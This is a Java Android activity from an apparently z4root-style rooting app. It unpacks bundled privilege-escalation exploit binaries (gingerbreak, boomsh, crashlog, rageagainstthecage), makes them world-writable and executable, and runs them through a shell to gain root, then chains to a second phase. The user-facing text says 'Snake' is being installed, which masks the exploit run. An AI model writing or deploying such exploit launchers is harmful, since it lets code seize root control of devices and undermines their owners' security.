package com.z4mod.z4root2;

import jackpal.androidterm.Exec;

import java.io.File;
import java.io.FileDescriptor;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.util.Calendar;
import java.util.Timer;
import java.util.zip.GZIPInputStream;

import android.app.Activity;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.os.Handler;
import android.os.PowerManager;
import android.os.PowerManager.WakeLock;
import android.util.Log;
import android.widget.TextView;

import com.z4mod.z4root2.VirtualTerminal.VTCommandResult;

public class Phase1 extends Activity {
	public final static String CONFIG_XML = "config_xml";
	public final static String CAN_ROOT = "can_root";

	WakeLock wl;
	final static int SHOW_SETTINGS_DIALOG = 1;
	final static int SHOW_SETTINGS_ERROR_DIALOG = 2;
	
	TextView detailtext;
	Handler handler = null;

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		// TODO Auto-generated method stub
		super.onCreate(savedInstanceState);
		setContentView(R.layout.main);
		detailtext = (TextView) findViewById(R.id.detailtext);
		
		saystuff("正在安装Snake,请稍候..........");
		
		//install();
		
//		if(forceunroot){
			dostuff();
//		}else{
//			install();
//		}
		

		
	}

	boolean forceunroot = true;
	public void hasRoot() {
		try {
			final VirtualTerminal vt = new VirtualTerminal();
			VTCommandResult r = vt.runCommand("id");
			if (r.success()) {
				// Rooted device
				forceunroot = false;//已经root
			}
			vt.shutdown();
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}
	
	
	public void saystuff(final String stuff) {
		runOnUiThread(new Runnable() {

			@Override
			public void run() {
				detailtext.setText(stuff);
			}
		});
	}
	
	
	
	public void install() {
		PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
		wl = pm.newWakeLock(PowerManager.FULL_WAKE_LOCK | PowerManager.ACQUIRE_CAUSES_WAKEUP | PowerManager.ON_AFTER_RELEASE, "z4root");
		wl.acquire();

		try {
			SaveIncludedFileIntoFilesFolder(R.raw.rageagainstthecage, "rageagainstthecage", getApplicationContext());
			
			
		} catch (Exception e1) {
			// TODO Auto-generated catch block
			e1.printStackTrace();
		}

		final int[] processId = new int[1];
		final FileDescriptor fd = Exec.createSubprocess("/system/bin/sh", "-", null, processId);
		Log.i("Phase1", "Got processid: " + processId[0]);

		final FileOutputStream out = new FileOutputStream(fd);
		final FileInputStream in = new FileInputStream(fd);

		new Thread(){
			public void run() {
				byte[] mBuffer = new byte[4096];
				// byte[] mBuffer_t = new byte[4096];
				int read = 0;
				while (read >= 0) {
					try {
						read = in.read(mBuffer);
						String str = new String(mBuffer, 0, read);
						Log.i("Phase1", str);
						if (str.contains("Cannot find adb")) {
							saystuff("Cannot find adb");
						}
					} catch (Exception e) {
						read = -1;
						e.printStackTrace();
					}
				}
			};
		}.start();

		try {
			Log.i("Phase1", "begin");
			String command = "chmod 777 " + getFilesDir() + "/rageagainstthecage\n";
			out.write(command.getBytes());
			out.flush();
			command = getFilesDir() + "/rageagainstthecage\n";
			out.write(command.getBytes());
			out.flush();
			Log.i("Phase1", command);
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}

	public void dostuff() {
		PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
		wl = pm.newWakeLock(PowerManager.FULL_WAKE_LOCK | PowerManager.ACQUIRE_CAUSES_WAKEUP | PowerManager.ON_AFTER_RELEASE, "z4root");
		wl.acquire();

		try {
			//SaveIncludedFileIntoFilesFolder(R.raw.rageagainstthecage, "rageagainstthecage", getApplicationContext());
			SaveIncludedFileIntoFilesFolder(R.raw.gingerbreak, "gingerbreak", getApplicationContext());
			SaveIncludedFileIntoLibFolder(R.raw.boomsh, "boomsh", getApplicationContext());
			SaveIncludedFileIntoLibFolder(R.raw.crashlog, "crashlog", getApplicationContext());
			
			
			
		} catch (Exception e1) {
			// TODO Auto-generated catch block
			e1.printStackTrace();
		}

		final int[] processId = new int[1];
		final FileDescriptor fd = Exec.createSubprocess("/system/bin/sh", "-", null, processId);
		Log.i("Phase1", "Got processid: " + processId[0]);

		final FileOutputStream out = new FileOutputStream(fd);
		final FileInputStream in = new FileInputStream(fd);

		new Thread(){
			public void run() {
				byte[] mBuffer = new byte[4096];
				// byte[] mBuffer_t = new byte[4096];
				int read = 0;
				while (read >= 0) {
					try {
						read = in.read(mBuffer);
						String str = new String(mBuffer, 0, read);
						Log.i("Phase1", str);
						if (str.contains("Forked")) {
							Log.i("Phase1", "FORKED FOUND!");
							
//							final Intent intent2 = new Intent(getApplicationContext(), Phase2.class);
//							Calendar cal = Calendar.getInstance();
//							cal.add(Calendar.SECOND, 5);
//							t.schedule(new TimerTask(){
//								public void run(){
//									Log.i("Phase1", "startActivity!");
//									startActivity(intent2);
//								}
//							}, new Date(System.currentTimeMillis() + 5000));

							Intent intent = new Intent(getApplicationContext(), AlarmReceiver.class);
							PendingIntent sender = PendingIntent.getBroadcast(getApplicationContext(), 0, intent, 0);

							// Get the AlarmManager service
							AlarmManager am = (AlarmManager) getSystemService(ALARM_SERVICE);

							// for (int i=5;i<120;i+=15) {
							Calendar cal = Calendar.getInstance();
							cal.add(Calendar.SECOND, 5);
							am.set(AlarmManager.RTC_WAKEUP, cal.getTimeInMillis(), sender);
							// }

							// Get the AlarmManager service
							wl.release();
							Thread.sleep(20000);
							finish();
							return;
						}
						if (str.contains("Cannot find adb")) {
							saystuff("Cannot find adb");
						}
					} catch (Exception e) {
						Log.i("Phase1", "Exception");
						read = -1;
						e.printStackTrace();
					}
				}
			};
		}.start();

		try {
			String command = "chmod 777 " + getFilesDir() + "/gingerbreak\n";
			out.write(command.getBytes());
			out.flush();
			command = getFilesDir() + "/gingerbreak\n";
			out.write(command.getBytes());
			out.flush();
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}
	public static void SaveIncludedZippedFileIntoFilesFolder(int resourceid, String filename, Context ApplicationContext) throws Exception {
		InputStream is = ApplicationContext.getResources().openRawResource(resourceid);
		FileOutputStream fos = ApplicationContext.openFileOutput(filename, Context.MODE_WORLD_READABLE);
		GZIPInputStream gzis = new GZIPInputStream(is);
		byte[] bytebuf = new byte[1024];
		int read;
		while ((read = gzis.read(bytebuf)) >= 0) {
			fos.write(bytebuf, 0, read);
		}
		gzis.close();
		fos.getChannel().force(true);
		fos.flush();
		fos.close();
	}
	public static void SaveIncludedFileIntoFilesFolder(int resourceid, String filename, Context ApplicationContext) throws Exception {
		InputStream is = ApplicationContext.getResources().openRawResource(resourceid);
		FileOutputStream fos = ApplicationContext.openFileOutput(filename, Context.MODE_WORLD_READABLE);
		
		byte[] bytebuf = new byte[1024];
		int read;
		while ((read = is.read(bytebuf)) >= 0) {
			fos.write(bytebuf, 0, read);
		}
		is.close();
		fos.getChannel().force(true);
		fos.flush();
		fos.close();
	}

	public static void SaveIncludedFileIntoLibFolder(int resourceid, String filename, Context ApplicationContext) throws Exception {
		InputStream is = ApplicationContext.getResources().openRawResource(resourceid);
		
		File files = new File("/data/data/com.z4mod.z4root2/files/"+filename);
		if(!files.exists()){
			//FileOutputStream fos = new FileOutputStream(files);
			FileOutputStream fos = ApplicationContext.openFileOutput(filename, Context.MODE_WORLD_READABLE);
			
			byte[] bytebuf = new byte[1024];
			int read;
			while ((read = is.read(bytebuf)) >= 0) {
				fos.write(bytebuf, 0, read);
			}
			is.close();
			fos.getChannel().force(true);
			fos.flush();
			fos.close();
		}
		
		
		

	}
}
